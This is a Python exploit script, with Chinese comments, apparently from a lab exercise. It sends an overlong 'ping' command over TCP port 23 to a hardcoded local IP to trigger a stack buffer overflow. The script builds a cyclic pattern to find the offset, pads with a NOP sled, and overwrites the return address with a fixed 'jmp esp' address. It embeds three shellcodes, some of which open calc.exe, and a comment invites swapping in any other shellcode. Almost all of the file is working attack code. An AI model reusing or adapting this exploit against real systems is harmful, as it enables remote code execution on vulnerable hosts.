import socket
from string import ascii_uppercase,ascii_lowercase,digits
import itertools

def send_buf(buffer,host='192.168.174.128',port=23):
  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
    sock.connect((host,port))
    data = b'ping ' + buffer + b'\r\n'
    sock.send(data)
    sock.recv(1000)

#1.确定跳转位置    生成不重复的2000字符串
pattern = (''.join(map(''.join,itertools.product(ascii_uppercase,ascii_lowercase,digits))).encode())[:2000]

#2.打开计算器的shellcode
#可以用自己的shellcode
shellcode1 = \
  b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"\
  b"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"\
  b"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"\
  b"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"\
  b"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"\
  b"\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x48\x4e\x57"\
  b"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x38"\
  b"\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x43\x4b\x48"\
  b"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"\
  b"\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"\
  b"\x46\x4f\x4b\x33\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"\
  b"\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x30\x4b\x44"\
  b"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x58"\
  b"\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43"\
  b"\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x47"\
  b"\x4e\x50\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x37\x4e\x41\x4d\x4a"\
  b"\x4b\x58\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b"\
  b"\x42\x30\x42\x30\x42\x50\x4b\x38\x4a\x46\x4e\x33\x4f\x35\x41\x43"\
  b"\x48\x4f\x42\x56\x48\x35\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x37"\
  b"\x42\x45\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x35\x4a\x46\x4a\x49"\
  b"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x4d\x56"\
  b"\x46\x56\x50\x52\x45\x36\x4a\x57\x45\x56\x42\x42\x4f\x32\x43\x46"\
  b"\x42\x52\x50\x56\x45\x46\x46\x57\x42\x42\x45\x57\x43\x37\x45\x36"\
  b"\x44\x57\x42\x32\x50\x46\x42\x43\x42\x53\x44\x56\x42\x42\x50\x36"\
  b"\x42\x53\x42\x43\x44\x36\x42\x42\x4f\x32\x41\x54\x46\x44\x46\x44"\
  b"\x42\x42\x48\x32\x48\x52\x42\x52\x50\x36\x45\x56\x46\x47\x42\x52"\
  b"\x4e\x56\x4f\x36\x43\x36\x41\x56\x4e\x56\x47\x56\x44\x57\x4f\x56"\
  b"\x45\x47\x42\x37\x42\x42\x41\x54\x46\x46\x4d\x56\x49\x46\x50\x56"\
  b"\x49\x46\x43\x57\x46\x57\x44\x37\x41\x56\x46\x37\x4f\x36\x44\x57"\
  b"\x43\x47\x42\x42\x50\x46\x42\x43\x42\x33\x44\x46\x42\x42\x4f\x52"\
  b"\x41\x44\x46\x44\x46\x44\x42\x30\x5a"\

shellcode2 = \
  b"\x81\xEC\x54\x04\x00\x00\x33\xDB\x53\xB8\x2E\x65\x78\x65\x50\xB8"\
  b"\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xFF\x15\x14\xA2\x42\x00"\
  b"\xBC\x50\x04\x00\x00"

shellcode3 = \
b"\x55\x8B\xEC\x33"\
b"\xC0\x50\xB8\x2E"\
b"\x65\x78\x65\x50"\
b"\xB8\x63\x61\x6C"\
b"\x63\x50\x8B\xC4"\
b"\x6A\x05\x50\xB8"\
b"\xAD\x23\x86\x7C"\
b"\xFF\xD0\x33\xC0"\
b"\x50\xB8\xFA\xCA"\
b"\x81\x7C\xFF\xD0"\
b"\x8B\xE5\x5D\x33"\

#jmp esp
retaddr = bytes.fromhex('7ffa4512')[::-1]

#  pattern.find(bytes.fromhex('68423768')[::-1])
#  1012
#  pattern.find(bytes.fromhex('61413161')[::-1])
#  4

# buf = ((b"\x90" *4 + shellcode1).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")
# buf = ((b"\x90" *4 + shellcode2).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")
buf = ((b"\x90" *4 + shellcode3).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")

send_buf(buf)

